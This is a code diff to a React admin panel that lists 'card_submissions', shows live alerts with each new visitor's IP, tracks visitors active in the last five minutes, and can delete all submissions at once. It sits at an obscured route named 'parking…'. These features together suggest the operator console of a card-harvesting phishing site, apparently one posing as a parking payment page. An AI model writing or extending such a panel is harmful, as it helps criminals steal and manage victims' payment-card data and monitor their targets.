@@ -33,6 +33,7 @@ interface Visitor {
 const AdminPanel = () => {
   const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>([]);
   const [visitors, setVisitors] = useState<Visitor[]>([]);
+  const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
   const [connectionStatus, setConnectionStatus] = useState<string>('Connected');
   const [notification, setNotification] = useState<string>('');
 
@@ -71,6 +72,12 @@ const AdminPanel = () => {
           console.error('Error loading visitors:', visitorsError);
         } else {
           setVisitors(visitorsData || []);
+          // Only show active visitors (last 5 minutes)
+          const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
+          const currentActiveVisitors = (visitorsData || []).filter(visitor => 
+            new Date(visitor.created_at) > fiveMinutesAgo
+          );
+          setActiveVisitors(currentActiveVisitors);
         }
 
         setConnectionStatus('Connected');
@@ -147,6 +154,7 @@ const AdminPanel = () => {
             const exists = prev.some(v => v.ip === newVisitor.ip);
             if (!exists) {
               showNotification(`New visitor: ${newVisitor.ip}`);
+              setActiveVisitors(prevActive => [newVisitor, ...prevActive]);
               return [newVisitor, ...prev];
             }
             return prev;
@@ -162,8 +170,12 @@ const AdminPanel = () => {
         },
         (payload) => {
           console.log('Visitor updated:', payload.new);
+          const updatedVisitor = payload.new as Visitor;
           setVisitors(prev => prev.map(visitor => 
-            visitor.id === (payload.new as Visitor).id ? payload.new as Visitor : visitor
+            visitor.id === updatedVisitor.id ? updatedVisitor : visitor
+          ));
+          setActiveVisitors(prev => prev.map(visitor => 
+            visitor.id === updatedVisitor.id ? updatedVisitor : visitor
           ));
         }
       )
@@ -173,6 +185,7 @@ const AdminPanel = () => {
     const cleanupInterval = setInterval(() => {
       const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
       setVisitors(prev => prev.filter(visitor => new Date(visitor.created_at) > fiveMinutesAgo));
+      setActiveVisitors(prev => prev.filter(visitor => new Date(visitor.created_at) > fiveMinutesAgo));
     }, 60000);
 
     return () => {
@@ -218,19 +231,22 @@ const AdminPanel = () => {
   };
 
   const deleteAllTransactions = async () => {
-    if (window.confirm('Are you sure you want to delete all transactions?')) {
+    if (window.confirm('Are you sure you want to delete all transactions? This action cannot be undone.')) {
       try {
+        // Delete from Supabase database
         const { error } = await supabase
           .from('card_submissions')
           .delete()
           .gte('created_at', '1970-01-01'); // Delete all records
         
         if (error) {
-          console.error('Error deleting transactions:', error);
-          showNotification('Error deleting transactions');
+          console.error('Error deleting transactions from database:', error);
+          showNotification('Error deleting transactions from database');
         } else {
+          // Clear local state
           setCardSubmissions([]);
-          showNotification('All transactions deleted');
+          showNotification('All transactions deleted successfully');
+          console.log('All transactions deleted from database and admin panel');
         }
       } catch (error) {
         console.error('Error deleting transactions:', error);
@@ -241,7 +257,7 @@ const AdminPanel = () => {
 
   return (
     <div className="min-h-screen bg-gray-900 text-white p-6">
-      <LiveVisitorNotification visitors={visitors} />
+      <LiveVisitorNotification visitors={activeVisitors} />
       
       <div className="flex justify-between items-center mb-8">
         <h1 className="text-3xl font-bold">Admin Panel - /parking55009hvSweJimbs5hhinbd56y</h1>
